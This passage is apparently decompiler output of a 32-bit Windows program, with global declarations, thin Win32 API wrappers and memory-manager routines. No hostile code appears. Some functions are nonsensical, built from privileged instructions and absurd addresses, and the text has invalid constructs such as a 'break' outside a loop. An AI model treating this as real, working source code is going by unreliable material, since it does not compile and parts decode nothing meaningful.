int32_t g34; // 0x40813c
int32_t g35; // 0x408140
int32_t g36; // 0x408148
int32_t g37; // 0x408154
int32_t g39 = 0; // 0x409000
int32_t g40 = 0; // 0x40900c
int32_t g41 = 0; // 0x409010
int32_t g42 = 0; // 0x409014
int32_t g43 = 0; // 0x40901c
int32_t g44 = 0; // 0x409020
int32_t g45 = 0; // 0x409024
int32_t g46 = 0; // 0x409028
int32_t g47 = 0; // 0x40902c
int32_t g48 = 0; // 0x409030
char g49 = 0; // 0x409034
char g50 = 0; // 0x409035
int32_t g51 = 0; // 0x409036
int32_t g52 = 0; // 0x409038
int32_t g53 = 0; // 0x40903c
int16_t g54 = 0; // 0x409208
int32_t g55 = 0; // 0x4093d4
int32_t g56 = 0; // 0x40959c
int32_t g57 = 0; // 0x4095a0
int32_t g58 = 0; // 0x4095a4
int32_t g59 = 0; // 0x4095a8
char g60 = 0; // 0x4095ac
int32_t g61 = 0; // 0x4095b0
struct _RTL_CRITICAL_SECTION * g62 = NULL; // 0x4095b4
int32_t g63 = 0; // 0x4095cc
int32_t g64 = 0; // 0x4095d0
int32_t g65 = 0; // 0x4095d4
int32_t g66 = 0; // 0x4095e4
int32_t g67 = 0; // 0x4095f4
int32_t g68 = 0; // 0x4095f8
int32_t g69 = 0; // 0x409600
int32_t g70 = 0; // 0x409604
int32_t g71 = 0; // 0x409608
int32_t g72 = 0; // 0x40960c
int32_t g73 = 0; // 0x409610
char * g74; // 0x409620
int32_t g75 = 0; // 0x409624
int32_t g76 = 0; // 0x409628
int32_t g77 = 0; // 0x40962c
int32_t g78 = 0; // 0x409630
char g79 = 0; // 0x409648
char g80 = 0; // 0x40964c
int32_t (*g81)(int32_t, int32_t, int32_t) = NULL; // 0x409650
int32_t g82 = 0; // 0x409654
int32_t g83 = 0; // 0x409658
int32_t g84 = 0; // 0x40965c
int32_t g85 = 0; // 0x409660
int32_t g86 = 0; // 0x409664
int32_t g87 = 0; // 0x409678
int32_t g88 = 0; // 0x40967c
int32_t g89 = 0; // 0x409680
int32_t g90 = 0; // 0x409684
int32_t g91 = 0; // 0x409688
int32_t g92 = 0; // 0x40968c
int32_t g93 = 0; // 0x409690
int32_t g94 = 0; // 0x409694
int32_t g95 = 0; // 0x409698
int32_t g96 = 0; // 0x40969c
int32_t g97 = 0; // 0x4096a0
int32_t g98 = 0; // 0x4096a4
int32_t g99 = 0; // 0x4096a8
int32_t g100 = 0; // 0x4096ac
int32_t g101 = 0; // 0x4096b0
int32_t g102 = 0; // 0x4096b4
int32_t g103 = 0; // 0x4096bc
int32_t g104 = 0; // 0x4096c0
int32_t g105 = 0; // 0x4096c8
int32_t g106 = 0; // 0x4096cc
int32_t g107 = 0; // 0x4096d4
int32_t g108 = 0; // 0x4096d8
int32_t g109 = 0; // 0x4096dc
int32_t g110 = 0; // 0x4096e0
int32_t g111 = 0; // 0x4096e4
int32_t g112 = 0; // 0x4096e8
int32_t g113 = 0; // 0x4096ec
int32_t g114 = 0; // 0x4096f0
int32_t g115 = 0; // 0x4096f4
int32_t g116 = 0; // 0x409808
int32_t g117;
int32_t * g38 = &g26; // 0x408160

// ------------------------ Functions -------------------------

// Address range: 0x401023 - 0x401026
int32_t function_401023(void) {
    // 0x401023
    int32_t result; // 0x401023
    return result;
}

// Address range: 0x401028 - 0x40102f
int32_t function_401028(void) {
    // 0x401028
    return function_ce239cad();
}

// Address range: 0x401038 - 0x40103d
int32_t function_401038(void) {
    // 0x401038
    return function_b8f9fe79();
}

// Address range: 0x401056 - 0x401057
int32_t function_401056(void) {
    // 0x401056
    int32_t result; // 0x401056
    return result;
}

// Address range: 0x40105b - 0x401063
int32_t function_40105b(void) {
    // 0x40105b
    int32_t result; // 0x40105b
    bool v1; // 0x40105b
    if (v1) {
        result = function_401056();
    }
    // 0x40105d
    int32_t v2; // 0x40105b
    int32_t v3; // 0x40105b
    *(int32_t *)v2 = __asm_insd((int16_t)v3);
    return result;
}

// Address range: 0x401063 - 0x401106
int32_t function_401063(void) {
    char v1 = *(char *)-0x4ddcdf6b; // 0x401063
    bool v2; // 0x401063
    char v3 = v1 - (v2 ? 57 : 56); // 0x401063
    *(char *)-0x4ddcdf6b = v3;
    int32_t v4; // 0x401063
    if (((v3 ^ -1) + (char)v2 & v1) < 0) {
        // 0x4010ef
        int32_t v5; // 0x401063
        *(int32_t *)v5 = 2 * v5;
        int32_t result = __asm_hlt(); // 0x401102
        unsigned char v6 = (char)v4 & 31; // 0x401103
        if (v6 != 0) {
            char * v7 = (char *)(v4 + 56); // 0x401103
            *v7 = *v7 >> v6;
        }
        // 0x4010c6
        return result;
    }
    int32_t v8 = __asm_wait(); // 0x401075
    int32_t v9 = (v8 & 255) * (int32_t)*(char *)-0x682de802; // 0x401078
    int32_t v10; // 0x401063
    unsigned char v11 = *(char *)((v9 & 255) + v10); // 0x40107a
    int32_t v12 = v8 & -0x3440000 | (int32_t)v11 | v9 & 0x2a00 | 0x343d586; // 0x40107b
    int32_t v13 = v12 - 1; // 0x401080
    bool v14; // 0x401063
    bool v15; // 0x401063
    bool v16; // 0x401063
    bool v17; // 0x401063
    int32_t v18 = 0x4000 * (int32_t)v14 | 1024 * (int32_t)v15 | 512 * (int32_t)v16 | 256 * (int32_t)v17 | 128 * (int32_t)(v12 < 1) | 2048 * (int32_t)((v8 & -v12) < 0) | 4 * (int32_t)((llvm_ctpop_i8((char)v13) & 1) == 0) | 3; // bp-4, 0x401084
    int32_t v19 = v4 & -256 | 220; // 0x401084
    int32_t v20 = &v18; // 0x401084
    int32_t v21 = -0xb416f41; // 0x401084
    int32_t v22; // 0x401063
    int32_t v23 = v22;
    int32_t v24 = v13 & 171 | 84; // 0x401087
    int32_t v25 = v24 | v13 & -256; // 0x401087
    int32_t v26; // 0x401063
    char * v27 = (char *)(v23 + 8 * v26); // 0x40108a
    *v27 = *v27 / 2;
    int32_t * v28 = (int32_t *)(v21 - 21); // 0x40108d
    *v28 = *v28 + v19;
    char * v29 = (char *)v25; // 0x401090
    char v30 = *v29 & (char)v24; // 0x401090
    char v31 = llvm_ctpop_i8(v30); // 0x401090
    *v29 = v30;
    bool v32; // 0x401063
    bool v33; // 0x401063
    bool v34; // 0x401063
    *(int32_t *)(v20 - 4) = 1024 * (int32_t)v32 | 0x4000 * (int32_t)v33 | 256 * (int32_t)v34 | 64 * (int32_t)(v30 == 0) | 128 * (int32_t)(v30 < 0) | 4 * (int32_t)((v31 & 1) == 0) | 2;
    int32_t * v35 = (int32_t *)(v25 + 0x6d194a8c); // 0x401094
    *v35 = *v35 + v26;
    __asm_int3();
    int32_t v36 = *(int32_t *)(v21 + 0x6713db11); // 0x40109c
    int32_t v37 = *(int32_t *)(v36 - 1); // 0x4010a8
    __asm_iretd();
    int32_t v38 = __asm_fnstenv(); // 0x4010ad
    *(int224_t *)(v21 + 84) = (int224_t)v38;
    char * v39 = (char *)v19; // 0x4010b0
    char v40 = *v39 ^ -81; // 0x4010b0
    *v39 = v40;
    while (v40 != 0) {
        int32_t v41 = __asm_iretd() - 0x40e3868a; // 0x4010be
        v20 = v36 + 1;
        v19--;
        v32 = (v37 & 1024) != 0;
        v33 = (v37 & 0x4000) != 0;
        v34 = (v37 & 256) != 0;
        v21++;
        int32_t result2 = v41; // 0x4010c4
        if (v19 != 0 != (v41 == 0)) {
            // 0x4010c6
            return result2;
        }
        v23 = -0x22a575e9;
        v24 = v41 & 171 | 84;
        v25 = v24 | v41 & -256;
        v27 = (char *)(v23 + 8 * v26);
        *v27 = *v27 / 2;
        v28 = (int32_t *)(v21 - 21);
        *v28 = *v28 + v19;
        v29 = (char *)v25;
        v30 = *v29 & (char)v24;
        v31 = llvm_ctpop_i8(v30);
        *v29 = v30;
        *(int32_t *)(v20 - 4) = 1024 * (int32_t)v32 | 0x4000 * (int32_t)v33 | 256 * (int32_t)v34 | 64 * (int32_t)(v30 == 0) | 128 * (int32_t)(v30 < 0) | 4 * (int32_t)((v31 & 1) == 0) | 2;
        v35 = (int32_t *)(v25 + 0x6d194a8c);
        *v35 = *v35 + v26;
        __asm_int3();
        v36 = *(int32_t *)(v21 + 0x6713db11);
        v37 = *(int32_t *)(v36 - 1);
        __asm_iretd();
        v38 = __asm_fnstenv();
        *(int224_t *)(v21 + 84) = (int224_t)v38;
        v39 = (char *)v19;
        v40 = *v39 ^ -81;
        *v39 = v40;
    }
    char v42 = __asm_in((int16_t)v25); // 0x4010cd
    int32_t v43 = (v23 + 1 & -256 | (int32_t)v42) + *(int32_t *)v38; // 0x4010ce
    __asm_int(77);
    unsigned char v44 = (char)v43; // 0x4010d4
    int32_t v45; // 0x401063
    if ((v44 & 14) > 9) {
        v45 = (v44 > 153 ? 154 : 250) + v43 & 255 | v43 & -256;
    } else {
        v45 = (v44 > 153 ? v43 + 160 : v43) & 255 | v43 & -256;
    }
    __asm_out(190, (char)v45);
    *(int32_t *)-0x611b0b6c = v45;
    return function_afceb517();
}

// Address range: 0x40110a - 0x40110d
int32_t function_40110a(void) {
    // 0x40110a
    int32_t result; // 0x40110a
    return result;
}

// Address range: 0x40110d - 0x4011d4
int32_t function_40110d(int32_t a1, int16_t a2) {
    // 0x40110d
    int32_t v1; // 0x40110d
    int32_t v2 = v1 + 1; // 0x40114a
    int32_t hFile = v2 & 255 | v1 & -256; // 0x40114a
    int32_t v3; // 0x40110d
    int32_t v4 = 0x10000 * v3 / 0x10000 & -256; // 0x40114c
    int32_t v5; // 0x40110d
    __asm_outsd((int16_t)hFile, v5);
    int32_t * v6 = (int32_t *)v4; // 0x40114f
    *v6 = *v6 + v4;
    int32_t v7; // 0x40110d
    unsigned char v8 = *(char *)&v7; // 0x401152
    if (v8 == 0) {
        bool result = WriteFile((int32_t *)hFile, (int32_t *)-0x4b1b0b9a, (int32_t)&g117, &g117, (struct _OVERLAPPED *)&g117); // 0x4011ce
        return result;
    }
    int32_t v9 = v4 | (int32_t)v8; // 0x401152
    char * v10 = (char *)v9; // 0x40115e
    *v10 = *v10 + 14 * v8;
    bool v11; // 0x40110d
    int32_t v12 = v11 ? -1 : 1; // 0x40117a
    int32_t v13 = v7 + v12; // 0x40117a
    int32_t * v14 = (int32_t *)v9; // 0x40117b
    int32_t v15; // 0x40110d
    *v14 = v9 + (int32_t)(*(char *)&v7 < *(char *)&v15) + *v14;
    *v10 = *v10 + 3 * v8;
    char * v16 = (char *)v13; // 0x401189
    int32_t v17; // 0x40110d
    char v18 = (char)v17 - 1; // 0x401189
    *v16 = *v16 + v18;
    char * v19 = (char *)hFile; // 0x40118d
    char v20 = v2; // 0x40118d
    *v19 = *v19 + v20;
    *v16 = *v16 + v20;
    *v19 = *v19 + v18;
    *v16 = v8 - 12 + *v16;
    __asm_bound(*(int64_t *)(hFile + 101));
    __asm_arpl(*(int16_t *)(9 * (v15 + v12) + 28), (int16_t)v13);
    RaiseException((int32_t)&g117, (int32_t)&g117, (int32_t)&g117, &g117);
    return &g117;
}

// Address range: 0x4011d6 - 0x4011dc
void function_4011d6(int32_t uExitCode) {
    // 0x4011d6
    ExitProcess(uExitCode);
}

// Address range: 0x4011de - 0x4011e4
int32_t function_4011de(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType) {
    // 0x4011de
    return MessageBoxA(hWnd, lpText, lpCaption, uType);
}

// Address range: 0x4011e6 - 0x4011ec
bool function_4011e6(int32_t * hLibModule) {
    // 0x4011e6
    return FreeLibrary(hLibModule);
}

// Address range: 0x4011ee - 0x4011f4
char * function_4011ee(void) {
    // 0x4011ee
    return GetCommandLineA();
}

// Address range: 0x4011f6 - 0x4011fc
int32_t function_4011f6(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData) {
    // 0x4011f6
    return GetLocaleInfoA(Locale, LCType, lpLCData, cchData);
}

// Address range: 0x4011fe - 0x401204
void function_4011fe(struct _STARTUPINFOA * lpStartupInfo) {
    // 0x4011fe
    GetStartupInfoA(lpStartupInfo);
}

// Address range: 0x401206 - 0x40120c
int32_t function_401206(void) {
    // 0x401206
    return GetThreadLocale();
}

// Address range: 0x40120e - 0x401214
int32_t function_40120e(int32_t a1) {
    // 0x40120e
    return RegCloseKey2();
}

// Address range: 0x401216 - 0x40121c
int32_t function_401216(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, char * a6, int32_t a7) {
    // 0x401216
    return RegOpenKeyExA2();
}

// Address range: 0x40121e - 0x401224
int32_t function_40121e(int32_t a1) {
    // 0x40121e
    return RegQueryValueExA2();
}

// Address range: 0x401226 - 0x40122c
int32_t function_401226(int16_t ** pbstr, int16_t * psz, int32_t len) {
    // 0x401226
    return SysReAllocStringLen(pbstr, psz, len);
}

// Address range: 0x40122e - 0x401234
void function_40122e(int16_t * bstrString) {
    // 0x40122e
    SysFreeString(bstrString);
}

// Address range: 0x401236 - 0x40123c
int32_t function_401236(void) {
    // 0x401236
    return GetCurrentThreadId();
}

// Address range: 0x40123e - 0x401244
int32_t function_40123e(void) {
    // 0x40123e
    return GetVersion();
}

// Address range: 0x401246 - 0x40124c
bool function_401246(struct _LARGE_INTEGER * lpPerformanceCount) {
    // 0x401246
    return QueryPerformanceCounter(lpPerformanceCount);
}

// Address range: 0x40124e - 0x401254
int32_t function_40124e(void) {
    // 0x40124e
    return GetTickCount();
}

// Address range: 0x401256 - 0x401278
int32_t function_401256(void) {
    // 0x401256
    int32_t lpStartupInfo; // 0x401256
    GetStartupInfoA((struct _STARTUPINFOA *)lpStartupInfo);
    uint16_t v1; // 0x401256
    char v2; // 0x401256
    return (v2 & 1) == 0 ? 10 : (int32_t)v1;
}

// Address range: 0x40127a - 0x401280
int32_t function_40127a(void) {
    // 0x40127a
    return LocalAlloc2();
}

// Address range: 0x401282 - 0x401288
int32_t function_401282(void) {
    // 0x401282
    return LocalFree2();
}

// Address range: 0x40128a - 0x401290
int32_t * function_40128a(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect) {
    // 0x40128a
    return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

// Address range: 0x401292 - 0x401298
bool function_401292(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType) {
    // 0x401292
    return VirtualFree(lpAddress, dwSize, dwFreeType);
}

// Address range: 0x40129a - 0x4012a0
void function_40129a(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x40129a
    InitializeCriticalSection(lpCriticalSection);
}

// Address range: 0x4012a2 - 0x4012a8
void function_4012a2(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x4012a2
    EnterCriticalSection(lpCriticalSection);
}

// Address range: 0x4012aa - 0x4012b0
void function_4012aa(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x4012aa
    LeaveCriticalSection(lpCriticalSection);
}

// Address range: 0x4012b2 - 0x4012b8
void function_4012b2(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x4012b2
    DeleteCriticalSection(lpCriticalSection);
}

// Address range: 0x4012ba - 0x401309
int32_t function_4012ba(int32_t a1, int32_t a2) {
    int32_t result = g64; // 0x4012c1
    if (result != 0) {
        // 0x401300
        g64 = *(int32_t *)result;
        return result;
    }
    int32_t v1 = function_40127a(); // 0x4012cd
    if (v1 == 0) {
        // 0x4012d8
        return 0;
    }
    // 0x4012dd
    *(int32_t *)v1 = g63;
    g63 = v1;
    int32_t v2 = 0; // 0x4012ea
    int32_t result2 = v1 + 4 + 16 * v2; // 0x4012f0
    int32_t * v3 = (int32_t *)result2;
    *v3 = g64;
    g64 = result2;
    v2++;
    while (v2 != 100) {
        int32_t v4 = result2; // 0x4012f4
        result2 = v1 + 4 + 16 * v2;
        v3 = (int32_t *)result2;
        *v3 = v4;
        g64 = result2;
        v2++;
    }
    // 0x401300
    g64 = *v3;
    return result2;
}

// Address range: 0x40130a - 0x401310
int32_t function_40130a(void) {
    // 0x40130a
    int32_t result; // 0x40130a
    return result;
}

// Address range: 0x401312 - 0x401342
int32_t function_401312(void) {
    // 0x401312
    int32_t v1; // 0x401312
    int32_t v2; // 0x401312
    int32_t v3 = function_4012ba(v2, v1); // 0x401318
    if (v3 == 0) {
        // 0x401321
        return 0;
    }
    // 0x401326
    int32_t v4; // 0x401312
    *(int32_t *)(v3 + 12) = *(int32_t *)(v4 + 4);
    *(int32_t *)v3 = v3;
    *(int32_t *)(v3 + 4) = v3;
    int32_t v5; // 0x401312
    *(int32_t *)v5 = v3;
    return v3 & -256 | 1;
}

// Address range: 0x401342 - 0x40135a
int32_t function_401342(void) {
    // 0x401342
    int32_t result; // 0x401342
    int32_t * v1 = (int32_t *)(result + 4); // 0x401342
    *(int32_t *)result = g64;
    return result;
}

// Address range: 0x40135a - 0x4013ca
int32_t function_40135a(void) {
    // 0x40135a
    int32_t v1; // 0x40135a
    int32_t * v2 = (int32_t *)v1; // 0x40136e
    int32_t v3; // 0x40135a
    int32_t v4 = *(int32_t *)(v3 + 4); // 0x401370
    int32_t * v5 = (int32_t *)(v1 + 4); // 0x401373
    *v5 = v4;
    int32_t v6; // 0x40135a
    int32_t v7 = *(int32_t *)v6; // 0x401376
    int32_t * v8 = (int32_t *)(v6 + 8); // 0x40137a
    int32_t v9 = *v8; // 0x40137a
    int32_t * v10 = (int32_t *)(v6 + 12); // 0x40137d
    int32_t v11; // 0x40135a
    int32_t v12; // 0x401393
    int32_t v13; // 0x4013aa
    if (v1 != *v10 + v9) {
        // 0x401398
        v11 = v4;
        if (v4 + v1 == v9) {
            // 0x4013a0
            function_401342();
            v13 = *v5 + *v10;
            *v5 = v13;
            v11 = v13;
        }
    } else {
        // 0x401384
        function_401342();
        *v2 = *v8;
        v12 = *v5 + *v10;
        *v5 = v12;
        v11 = v12;
    }
    int32_t v14 = v11; // 0x4013b1
    v6 = v7;
    int32_t v15; // 0x40135a
    while (v15 != v7) {
        // 0x401376
        v7 = *(int32_t *)v6;
        v8 = (int32_t *)(v6 + 8);
        v9 = *v8;
        v10 = (int32_t *)(v6 + 12);
        if (v1 != *v10 + v9) {
            // 0x401398
            v11 = v14;
            if (v14 + v1 == v9) {
                // 0x4013a0
                function_401342();
                v13 = *v5 + *v10;
                *v5 = v13;
                v11 = v13;
            }
        } else {
            // 0x401384
            function_401342();
            *v2 = *v8;
            v12 = *v5 + *v10;
            *v5 = v12;
            v11 = v12;
        }
        // 0x4013ad
        v14 = v11;
        v6 = v7;
    }
    int32_t v16 = function_401312(); // 0x4013b7
    int32_t result = v16; // 0x4013be
    if ((char)v16 == 0) {
        // 0x4013c0
        *v2 = 0;
        result = 0;
    }
    // 0x4013c4
    return result;
}

// Address range: 0x4013ca - 0x40145d
int32_t function_4013ca(void) {
    // 0x4013ca
    uint32_t v1; // 0x4013ca
    int32_t * v2 = (int32_t *)(v1 + 4);
    int32_t v3; // 0x4013ca
    int32_t * v4 = (int32_t *)(v3 + 8);
    uint32_t v5 = *v4; // 0x4013d7
    int32_t result; // 0x4013ca
    int32_t v6; // 0x4013e5
    uint32_t v7; // 0x4013e5
    int32_t v8; // 0x4013f6
    int32_t v9; // 0x4013f9
    int32_t v10; // 0x40143d
    int32_t v11; // 0x4013e0
    uint32_t v12; // 0x4013e0
    int32_t * v13; // 0x4013ca
    if (v1 >= v5) {
        // 0x4013de
        v11 = *v2;
        v12 = v11 + v1;
        v13 = (int32_t *)(v3 + 12);
        v6 = *v13;
        v7 = v6 + v5;
        if (v12 <= v7) {
            if (v1 != v5) {
                if (v12 != v7) {
                    // 0x401420
                    *v13 = v1 - v5;
                    v10 = function_401312();
                    result = 0;
                    if ((char)v10 != 0) {
                        // 0x40144a
                        result = v10 & -256 | 1;
                        return result;
                    } else {
                        return result;
                    }
                } else {
                    // 0x40141b
                    *v13 = v6 - v11;
                    // 0x40144a
                    result = v5 & -256 | 1;
                    return result;
                }
            } else {
                // 0x4013f0
                *v4 = v11 + v5;
                v8 = *v2;
                v9 = *v13 - v8;
                *v13 = v9;
                if (v9 != 0) {
                    // 0x40144a
                    result = v8 & -256 | 1;
                    return result;
                } else {
                    // 0x40144a
                    result = function_401342() & -256 | 1;
                    return result;
                }
            }
        }
    }
    int32_t v14 = *(int32_t *)v3; // 0x40144e
    result = 0;
    int32_t v15; // 0x4013ca
    while (v15 != v14) {
        int32_t v16 = v14;
        v4 = (int32_t *)(v16 + 8);
        v5 = *v4;
        if (v1 >= v5) {
            // 0x4013de
            v11 = *v2;
            v12 = v11 + v1;
            v13 = (int32_t *)(v16 + 12);
            v6 = *v13;
            v7 = v6 + v5;
            if (v12 <= v7) {
                if (v1 != v5) {
                    if (v12 != v7) {
                        // 0x401420
                        *v13 = v1 - v5;
                        v10 = function_401312();
                        result = 0;
                        if ((char)v10 != 0) {
                            // 0x40144a
                            result = v10 & -256 | 1;
                            return result;
                        } else {
                            return result;
                        }
                    } else {
                        // 0x40141b
                        *v13 = v6 - v11;
                        // 0x40144a
                        result = v5 & -256 | 1;
                        return result;
                    }
                } else {
                    // 0x4013f0
                    *v4 = v11 + v5;
                    v8 = *v2;
                    v9 = *v13 - v8;
                    *v13 = v9;
                    if (v9 != 0) {
                        // 0x40144a
                        result = v8 & -256 | 1;
                        return result;
                    } else {
                        // 0x40144a
                        result = function_401342() & -256 | 1;
                        return result;
                    }
                }
            }
        }
        // 0x40144e
        v14 = *(int32_t *)v16;
        result = 0;
    }
  lab_0x401456:
    // 0x401456
    return result;
}

// Address range: 0x40145e - 0x4014c1
int32_t function_40145e(void) {
    // 0x40145e
    int32_t dwFreeType; // 0x40145e
    int32_t v1; // 0x40145e
    *(int32_t *)(dwFreeType + 4) = v1 > 0xfffff ? v1 + 0xffff & -0x10000 : 0x100000;
    int32_t flAllocationType; // 0x40145e
    int32_t dwSize; // 0x40145e
    int32_t lpAddress; // 0x40145e
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, 1); // 0x40148d
    int32_t result = (int32_t)memory; // 0x40148d
    int32_t * v2 = (int32_t *)dwFreeType; // 0x401494
    *v2 = result;
    if (memory == NULL) {
        // 0x4014bd
        return result;
    }
    int32_t v3 = function_401312(); // 0x4014a1
    int32_t result2 = v3; // 0x4014a8
    if ((char)v3 == 0) {
        // 0x4014aa
        VirtualFree((int32_t *)0x8000, 0, dwFreeType);
        *v2 = 0;
        result2 = 0;
    }
    // 0x4014bd
    return result2;
}

// Address range: 0x4014c2 - 0x401539
int32_t function_4014c2(void) {
    // 0x4014c2
    int32_t v1; // 0x4014c2
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x4014cc
    *v2 = 0x100000;
    int32_t flAllocationType; // 0x4014c2
    int32_t dwSize; // 0x4014c2
    int32_t flProtect; // 0x4014c2
    int32_t lpAddress; // 0x4014c2
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, flProtect); // 0x4014e0
    int32_t v3 = (int32_t)memory; // 0x4014e0
    int32_t * v4 = (int32_t *)v1; // 0x4014e7
    *v4 = v3;
    int32_t memory2 = v3; // 0x4014eb
    int32_t v5; // bp-32, 0x4014c2
    int32_t * v6 = &v5; // 0x4014eb
    if (memory == NULL) {
        // 0x4014ed
        int32_t v7; // 0x4014c2
        int32_t flAllocationType2 = v7 + 0xffff & -0x10000; // 0x4014f3
        *v2 = flAllocationType2;
        int32_t flProtect2; // 0x4014c2
        memory2 = (int32_t)VirtualAlloc((int32_t *)4, 0x2000, flAllocationType2, flProtect2);
        *v4 = memory2;
        int32_t v8; // bp-48, 0x4014c2
        v6 = &v8;
    }
    // 0x40150c
    if (v1 == 0) {
        // 0x401534
        return memory2;
    }
    int32_t v9 = function_401312(); // 0x401518
    int32_t result = v9; // 0x40151f
    if ((char)v9 == 0) {
        int32_t v10 = (int32_t)v6;
        *(int32_t *)(v10 - 4) = 0x8000;
        *(int32_t *)(v10 - 8) = 0;
        VirtualFree(&g117, (int32_t)&g117, (int32_t)&g117);
        *v4 = 0;
        result = 0;
    }
    // 0x401534
    return result;
}

// Address range: 0x40153a - 0x4015f2
int32_t function_40153a(void) {
    // 0x40153a
    int32_t v1; // bp-36, 0x40153a
    int32_t v2 = &v1; // 0x40153e
    int32_t v3 = v2; // 0x4015c0
    if (g65 != (int32_t)&g65) {
        int32_t v4 = *(int32_t *)g65; // 0x401569
        uint32_t v5 = *(int32_t *)(g65 + 8); // 0x40156b
        int32_t v6 = v2; // 0x401570
        int32_t v7; // 0x40153a
        uint32_t v8; // 0x40153a
        uint32_t v9; // 0x40153a
        int32_t * v10; // 0x401574
        int32_t v11; // 0x40153a
        int32_t * v12; // 0x40157d
        int32_t * v13; // 0x40158c
        int32_t v14; // 0x40159d
        if (v9 <= v5) {
            // 0x401572
            v10 = (int32_t *)(g65 + 12);
            v11 = *v10 + v5;
            v6 = v2;
            if (v11 <= *(int32_t *)(v2 + 16)) {
                // 0x40157d
                v12 = (int32_t *)(v2 + 8);
                v7 = v11;
                if (v5 < *v12) {
                    // 0x401583
                    *v12 = v5;
                    v7 = *v10 + v5;
                }
                // 0x401587
                v8 = v7;
                v13 = (int32_t *)(v2 + 12);
                if (v8 > *v13) {
                    // 0x401592
                    *v13 = v8;
                }
                // 0x401596
                *(int32_t *)(v2 - 4) = 0x8000;
                *(int32_t *)(v2 - 8) = 0;
                v14 = v2 - 12;
                *(int32_t *)v14 = v5;
                if (!VirtualFree(&g117, (int32_t)&g117, (int32_t)&g117)) {
                    // 0x4015a7
                    g61 = 1;
                }
                // 0x4015b1
                function_401342();
                v6 = v14;
            }
        }
        int32_t v15 = v6;
        v3 = v15;
        while (v4 != (int32_t)&g65) {
            int32_t v16 = v15;
            int32_t v17 = v4;
            v4 = *(int32_t *)v17;
            v5 = *(int32_t *)(v17 + 8);
            v6 = v16;
            if (v9 <= v5) {
                // 0x401572
                v10 = (int32_t *)(v17 + 12);
                v11 = *v10 + v5;
                v6 = v16;
                if (v11 <= *(int32_t *)(v16 + 16)) {
                    // 0x40157d
                    v12 = (int32_t *)(v16 + 8);
                    v7 = v11;
                    if (v5 < *v12) {
                        // 0x401583
                        *v12 = v5;
                        v7 = *v10 + v5;
                    }
                    // 0x401587
                    v8 = v7;
                    v13 = (int32_t *)(v16 + 12);
                    if (v8 > *v13) {
                        // 0x401592
                        *v13 = v8;
                    }
                    // 0x401596
                    *(int32_t *)(v16 - 4) = 0x8000;
                    *(int32_t *)(v16 - 8) = 0;
                    v14 = v16 - 12;
                    *(int32_t *)v14 = v5;
                    if (!VirtualFree(&g117, (int32_t)&g117, (int32_t)&g117)) {
                        // 0x4015a7
                        g61 = 1;
                    }
                    // 0x4015b1
                    function_401342();
                    v6 = v14;
                }
            }
            // 0x4015b8
            v15 = v6;
            v3 = v15;
        }
    }
    int32_t * v18 = (int32_t *)(v3 + 4); // 0x4015c2
    int32_t v19 = *v18; // 0x4015c2
    *(int32_t *)v19 = 0;
    int32_t * v20 = (int32_t *)(v3 + 12); // 0x4015ca
    int32_t result = v19; // 0x4015cf
    if (*v20 != 0) {
        int32_t * v21 = (int32_t *)(v3 + 8); // 0x4015d5
        *(int32_t *)*v18 = *v21;
        result = *v20 - *v21;
        *(int32_t *)(*v18 + 4) = result;
    }
    // 0x4015ea
    return result;
}

// Address range: 0x4015f2 - 0x401684
int32_t function_4015f2(void) {
    // 0x4015f2
    int32_t v1; // 0x4015f2
    uint32_t v2 = v1 & -0x1000; // 0x401604
    int32_t v3; // 0x4015f2
    *(int32_t *)v3 = v2;
    int32_t v4; // 0x4015f2
    int32_t result = (v4 + 4095 + v1 & -0x1000) - v2; // 0x401627
    *(int32_t *)(v3 + 4) = result;
    if (g65 == (int32_t)&g65) {
        // 0x40167c
        return result;
    }
    int32_t v5 = g65;
    int32_t v6; // bp-28, 0x4015f2
    int32_t v7 = &v6;
    uint32_t v8 = *(int32_t *)(v5 + 8); // 0x401638
    uint32_t v9 = *(int32_t *)(v5 + 12) + v8; // 0x40163e
    uint32_t v10 = v2 > v8 ? v2 : v8;
    uint32_t v11 = *(int32_t *)(v7 + 8); // 0x401646
    uint32_t v12 = v9 > v11 ? v11 : v9;
    int32_t v13 = result; // 0x401652
    int32_t v14 = v7; // 0x401652
    int32_t * memory; // 0x40165f
    if (v12 > v10) {
        // 0x401654
        *(int32_t *)(v7 - 4) = 4;
        *(int32_t *)(v7 - 8) = 0x1000;
        *(int32_t *)(v7 - 12) = v12 - v10;
        v14 = v7 - 16;
        *(int32_t *)v14 = v10;
        memory = VirtualAlloc(&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117);
        v13 = (int32_t)memory;
        if (memory == NULL) {
            // break -> 0x401668
            break;
        }
    }
    int32_t v15 = v13;
    v5 = *(int32_t *)v5;
    int32_t result2 = v15; // 0x40167a
    while (v5 != (int32_t)&g65) {
        // 0x401638
        v7 = v14;
        v8 = *(int32_t *)(v5 + 8);
        v9 = *(int32_t *)(v5 + 12) + v8;
        v10 = v2 > v8 ? v2 : v8;
        v11 = *(int32_t *)(v7 + 8);
        v12 = v9 > v11 ? v11 : v9;
        v13 = v15;
        v14 = v7;
        if (v12 > v10) {
            // 0x401654
            *(int32_t *)(v7 - 4) = 4;
            *(int32_t *)(v7 - 8) = 0x1000;
            *(int32_t *)(v7 - 12) = v12 - v10;
            v14 = v7 - 16;
            *(int32_t *)v14 = v10;
            memory = VirtualAlloc(&g117, (int32_t)&g117, (int32_t)&g117, (int32_t)&g117);
            v13 = (int32_t)memory;
            if (memory == NULL) {
                // break -> 0x401668
                break;
            }
        }
        // 0x401672
        v15 = v13;
        v5 = *(int32_t *)v5;
        result2 = v15;
    }
    // 0x40167c
    return result2;
}

// Address range: 0x401686 - 0x401703
int32_t function_401686(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401686
    int32_t v1; // 0x401686
